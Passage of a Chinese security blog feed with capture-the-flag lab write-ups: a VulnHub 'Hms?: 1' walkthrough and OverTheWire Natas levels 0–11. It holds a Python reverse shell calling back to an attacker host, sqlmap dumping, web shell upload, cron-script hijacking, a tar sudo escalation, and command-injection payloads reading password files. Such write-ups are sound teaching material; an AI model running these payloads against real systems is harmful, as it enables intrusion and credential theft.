<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181656154.png" /></p>
<p>得 <code>champ:password</code></p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p><code>champ:password</code> 可登录 80，点击 about us
可下载个压缩包，扫目录并分析压缩包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.154&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,json,html -f -t 50 --cookie=<span class="string">&#x27;PHPSESSID=kqkc80n3hg7tko6i46u2i9212v&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181657553.png" /></p>
<p>funny.jpg 提取出个 hint.py</p>
<p>读下 sudo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> sudo                      </span><br><span class="line">Did you notice the file name? Isn<span class="string">&#x27;t is interesting?</span></span><br></pre></td></tr></table></figure>
<p>funny.bmp 可能有密码爆破尝试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181657554.png" /></p>
<p>经测密码是 <code>sudo</code> ，结合 hint.py 提示推测 user.txt 是被
Rot13 加密了</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181714349.png" /></p>
<p>得 <code>wtf:this one is a simple one</code></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>尝试 ssh 登录 <code>wtf:this one is a simple one</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181715590.png" /></p>
<p>注意 lxd 有时也可用来提权…… ### 2.2. 提权</p>
<p><code>sudo -l</code> 查的可执行任何命令，直接提权</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181717455.png" /></p>
<p>成功！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Hms?: 1</title>
    <url>/2024/03/12/Hms%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a href="https://www.vulnhub.com/entry/hms-1,728/">Hms?: 1 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121147993.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121148830.png" /></p>
<p>所开端口：21【允许匿名登录】,22,7080【部署了HMS】</p>
<p>21 登录后没找到什么文件</p>
<h3 id="web-信息收集">1.3. web 信息收集</h3>
<p>7080 部署了HMS，目录遍历</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121416655.png" /></p>
<p>翻主页源码，还找到个
<code>http://192.168.159.139:7080/uploadImage/</code> 可直接访问</p>
<p>pages 下有个 save_user.php，但访问不了，test.php 返回个
daemon，猜测是用户名，好几个页面都要登录才能访问……</p>
<p>登录页直接测试 SQL 注入</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121150959.png" /></p>
<p>email 参数存在注入，直接跑 sqlmap</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.139:7080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.159.139:7080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.159.139:7080/login.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=188b2b497673d51a092a8b75ee6aa608</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="keyword">user</span>=<span class="keyword">admin</span>&amp;email=<span class="keyword">admin</span>%<span class="number">40123.</span>com&amp;<span class="keyword">password</span>=<span class="number">123456</span>&amp;btn_login=</span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121151664.png" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.txt --dbs -batch -D clinic_db -T admin -C <span class="string">&quot;username,password&quot;</span> --dump</span><br></pre></td></tr></table></figure>
<p>查到个 admin ，但解密失败</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121406986.png" /></p>
<p>利用sqlmap读取文件</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121407685.png" /></p>
<p>测试 --os-shell 失败，只能拿到个 --sql-shell ，想测试写 shell
，但路径不知道</p>
<p>利用 sql 注入漏洞登录，web 端找找漏洞</p>
<p>在 setting.php 页面发现可以上传文件，测试上传 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121448021.png" /></p>
<p>上传功能是公司logo，所以上传后估计就在 uploadImage 目录下，burpsuite
也返回了路径……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121445744.png" /></p>
<p>成功上传，蚁剑连接</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121446691.png" /></p>
<p>蚁剑终端有诸多限制，反弹个交互式的 shell，经测试靶机有安装 Python
环境，利用 Python 脚本反弹 shell</p>
<p>reshell.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;192.168.159.152&quot;</span>,<span class="number">4444</span>));</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>); </span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>); </span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121737766.png" /></p>
<p><strong>注</strong>，利用 php 也行，但尝试 bash
直接反弹shell未成功！蚁剑终端直接执行反弹 shell
的命令会失败【ret=2】,写成脚本文件并赋予执行权限来实现。</p>
<h3 id="提权">2.2. 提权</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121743546.png" /></p>
<p>尝试切换到这个权限更高的 bash</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121746887.png" /></p>
<p>成功！拥有访问 eren 用户资源的权限了</p>
<p>eren 下找到个 backup.sh</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121754404.png" /></p>
<p>可能是定时任务，查看下 crontab</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab /etc/cron.d/*</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121803005.png" /></p>
<p>backup.sh 会被定时执行【5分钟】，可以利用 backup.sh 反弹个 eren
用户的 shell</p>
<p>利用 echo 往backup.sh中写个反弹shell的命令</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121807625.png" /></p>
<p>kali 开启监听等一会</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121808945.png" /></p>
<p>拿到了 eren 的 shell，继续尝试提权</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121811185.png" /></p>
<p>直接利用 tar 提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/sh</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403121815425.png" /></p>
<p>拿到 flag</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Natas</title>
    <url>/2023/12/14/Natas/</url>
    <content><![CDATA[<p>Natas teaches the basics of serverside web-security.</p>
<p>Each level of natas consists of its own website located
at <strong>http://natasX.natas.labs.overthewire.org</strong>, where X is
the level number. There is <strong>no SSH login</strong>. To access a
level, enter the username for that level (e.g. natas0 for level 0) and
its password.</p>
<p>Each level has access to the password of the next level. Your job is
to somehow obtain that next password and level up. <strong>All passwords
are also stored in /etc/natas_webpass/</strong>. E.g. the password for
natas5 is stored in the file /etc/natas_webpass/natas5 and only readable
by natas4 and natas5.</p>
<p>Start here:</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas0</span><br><span class="line"><span class="symbol">Password:</span> natas0</span><br><span class="line"><span class="symbol">URL:</span>      http://natas0.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="natas-level-0">1. Natas Level 0</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas0</span><br><span class="line"><span class="symbol">Password:</span> natas0</span><br><span class="line"><span class="symbol">URL:</span>      http://natas0.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>右键源码得到
<code>The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6</code></p>
<h2 id="natas-level-0-level-1">2. Natas Level 0 → Level 1</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas1</span><br><span class="line"><span class="symbol">URL:</span>      http://natas1.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>鼠标右键被禁，直接按F12得到
<code>The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031057750.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031057257.png" /></p>
<h2 id="natas-level-1-level-2">3. Natas Level 1 → Level 2</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas2</span><br><span class="line"><span class="symbol">URL:</span>      http://natas2.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>源码发现个files路径，访问未做限制，该路径下发现个user.txt，内容如下</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="attr"># username:password</span></span><br><span class="line"><span class="attr">alice:BYNdCesZqW</span></span><br><span class="line"><span class="attr">bob:jw2</span>ueICLvT</span><br><span class="line">charlie:<span class="name">G5</span><span class="attr">vCxkVV3</span>m</span><br><span class="line"><span class="symbol">natas3</span>:<span class="name">G6</span>ctbMJ<span class="number">5</span><span class="symbol">Nb4</span>cbFwhpMPSvxGHhQ<span class="number">7</span>I<span class="number">6</span>W<span class="number">8</span>Q</span><br><span class="line">eve:z<span class="meta">o4</span>mJWy<span class="symbol">Nj2</span></span><br><span class="line">mallory:<span class="number">9</span>urtcpzBmH</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031101822.png" /></p>
<h2 id="natas-level-2-level-3">4. Natas Level 2 → Level 3</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas3</span><br><span class="line"><span class="symbol">URL:</span>      http://natas3.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>源码提示
<code>&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;</code>
，用dirsearch扫下目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://natas3.natas.labs.overthewire.org/&quot;</span> --auth=natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q --auth-type=basic</span><br></pre></td></tr></table></figure>
<p>发现个robots.txt，根据robots提示进一步得到
<code>natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm</code></p>
<h2 id="natas-level-3-level-4">5. Natas Level 3 → Level 4</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas4</span><br><span class="line"><span class="symbol">URL:</span>      http://natas4.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>根据提示修改 <code>Referer</code> 字段为
<code>http://natas5.natas.labs.overthewire.org/</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031114457.png" /></p>
<p>得
<code>Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD</code></p>
<h2 id="natas-level-4-level-5">6. Natas Level 4 → Level 5</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas5</span><br><span class="line"><span class="symbol">URL:</span>      http://natas5.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>登录了，但依旧提示
<code>Access disallowed. You are not logged in</code> ,
F12看下request和respond字段有啥特点，发现loggedin=0，尝试修改为1访问。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031123516.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031125126.png" /></p>
<p>得到
<code>Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR</code></p>
<h2 id="natas-level-5-level-6">7. Natas Level 5 → Level 6</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas6</span><br><span class="line"><span class="symbol">URL:</span>      http://natas6.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>根据提示看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;includes/secret.inc&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>)) &#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$secret </span>== <span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>]) &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Wrong secret&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务端用 include 包含了 <code>includes/secret.inc</code> 文件中的
<code>$secret</code> ，如果 <code>$secret</code> 和我们提交的 secret
相等，则输出 natas7 密码，远程尝试访问
<code>includes/secret.inc</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031136035.png" /></p>
<p>得到 <code>$secret="FOEIUWGHFEEUHOFUOIU"</code> ，提交得
<code>Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr</code></p>
<p>穿插 <strong><a
href="https://www.yzktw.com.cn/post/1392990.html">include函数php</a></strong></p>
<p>在PHP中，有一个非常重要的函数——include()。这个函数可以用于包含一个文件，并将其内容插入到当前的PHP脚本中。具体来说，include()函数可以将一个PHP文件的内容复制到当前脚本中。
比如，假设我们在当前脚本中要使用一个名为“header.php”的文件，可以在代码中使用以下语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;header.php&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这个语句的作用就是将“header.php”的内容插入到当前脚本中，并执行这个文件中的所有PHP代码。
通过这种方式，我们可以模块化地组织我们的PHP代码，将各种功能分散在不同的文件中，然后在需要的地方使用include()函数将它们引入到当前脚本中。
举个例子，我们可以在一个名为“config.php”的文件中定义一些常量和配置参数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_HOST&quot;</span>, <span class="string">&quot;localhost&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_USER&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_PASS&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_NAME&quot;</span>, <span class="string">&quot;my_database&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>然后，我们可以在需要连接数据库的脚本中使用include()函数将这个配置文件引入进来：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_NAME);</span><br></pre></td></tr></table></figure>
<p>这个例子展示了如何使用include()函数来引入一个包含数据库配置的文件，然后使用这些配置参数来连接数据库。
除了include()函数之外，还有一些类似的函数，比如require()和include_once()。这些函数都可以用来包含文件，但它们在使用上有一些细微的区别。
例如，require()函数和include()函数的作用是一样的，都可以包含文件，并将它们的内容插入到当前脚本中。但是，当被包含的文件不存在或者无法打开时，require()函数会产生一个致命错误并停止脚本的执行，而include()函数只会产生一个警告并继续执行脚本。
另外，include_once()函数和include()函数的作用也很相似，都是包含文件并将它们的内容插入到当前脚本中。但是，include_once()函数会先检查当前脚本是否已经包含过这个文件，如果已经包含过了，就不再包含，以避免重复定义变量和函数等问题。</p>
<h2 id="natas-level-6-level-7">8. Natas Level 6 → Level 7</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas7</span><br><span class="line"><span class="symbol">URL:</span>      http://natas7.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>根据源码提示猜测存在路径穿越漏洞【任意文件读取】，经测试得
<code>a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031143032.png" /></p>
<h2 id="natas-level-7-level-8">9. Natas Level 7 → Level 8</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas8</span><br><span class="line"><span class="symbol">URL:</span>      http://natas8.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>源码提示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$encodedSecret </span>= <span class="string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeSecret</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span><span class="title function_ invoke__"> bin2hex</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$secret</span>)));  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>)) &#123;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">encodeSecret</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>]) == <span class="variable">$encodedSecret</span>) &#123;  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Wrong secret&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>写个逆向encodeSecret函数对 $encodedSecret 解密后提交</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encodedSecret</span> = <span class="string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decodeSecret</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$secret</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decodeSecret</span>(<span class="variable">$encodedSecret</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031200634.png" /></p>
<p>提交 <code>oubWYf2kBq</code> 后得
<code>Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd</code></p>
<h2 id="natas-level-8-level-9">10. Natas Level 8 → Level 9</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas9</span><br><span class="line"><span class="symbol">URL:</span>      http://natas9.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  </span><br><span class="line"><span class="variable">$key </span>= <span class="string">&quot;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;needle&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;    <span class="variable">$key </span>= <span class="variable">$_REQUEST</span>[<span class="string">&quot;needle&quot;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key </span>!= <span class="string">&quot;&quot;</span>) &#123;    <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;grep -i <span class="subst">$key</span> dictionary.txt&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务端将我们请求提交的 <code>needle</code> 赋值给
<code>$key</code>，接着使用 <code>passthru</code>
函数执行系统命令。它运行 <code>grep</code> 命令来搜索
<code>dictionary.txt</code> 文件中包含 <code>$key</code>
关键词的文本，<code>-i</code> 选项用于忽略大小写。由于对
<code>$key</code>
未作任何过滤或转义，所以存在命令注入攻击的情况，示例如下【
<code>;</code> , <code>&amp;</code> , <code>|</code>
可用于bash下执行多条命令的分隔符】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">; <span class="built_in">cat</span>  /etc/natas_webpass/natas10 ;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031647620.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031647438.png" /></p>
<p>得 natas10 的
password：<code>D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE</code></p>
<h2 id="natas-level-9-level-10">11. Natas Level 9 → Level 10</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas10</span><br><span class="line"><span class="symbol">URL:</span>      http://natas10.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  </span><br><span class="line"><span class="variable">$key </span>= <span class="string">&quot;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;needle&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;    <span class="variable">$key </span>= <span class="variable">$_REQUEST</span>[<span class="string">&quot;needle&quot;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key </span>!= <span class="string">&quot;&quot;</span>) &#123;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[;|&amp;]/&#x27;</span>,<span class="variable">$key</span>)) &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Input contains an illegal character!&quot;</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;        <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;grep -i <span class="subst">$key</span> dictionary.txt&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在前面的基础上增加了对<code>;</code> , <code>&amp;</code> ,
<code>|</code> 的过滤，不能直接读取
<code>/etc/natas_webpass/natas11</code> 中的密码，但可以利用
<code>grep</code> 命令的其它参数间接获取，示例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-v <span class="built_in">test</span> /etc/natas_webpass/natas11</span><br></pre></td></tr></table></figure>
<p><code>-v</code>：这是 <code>grep</code>
命令的另一个选项，表示反转匹配。它用于查找不包含指定模式的文本行。</p>
<p>服务端执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -i -v <span class="built_in">test</span> /etc/natas_webpass/natas11 dictionary.txt</span><br></pre></td></tr></table></figure>
<p>该命令将在 <code>/etc/natas_webpass/natas11</code> 文件和
<code>dictionary.txt</code> 文件中查找不包含字符串 <code>test</code>
的文本行</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031715773.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311031715799.png" /></p>
<p>得 <code>natas11</code> :
<code>1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg</code></p>
<h2 id="natas-level-10-level-11">12. Natas Level 10 → Level 11</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas11</span><br><span class="line"><span class="symbol">URL:</span>      http://natas11.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>审计源码</p>
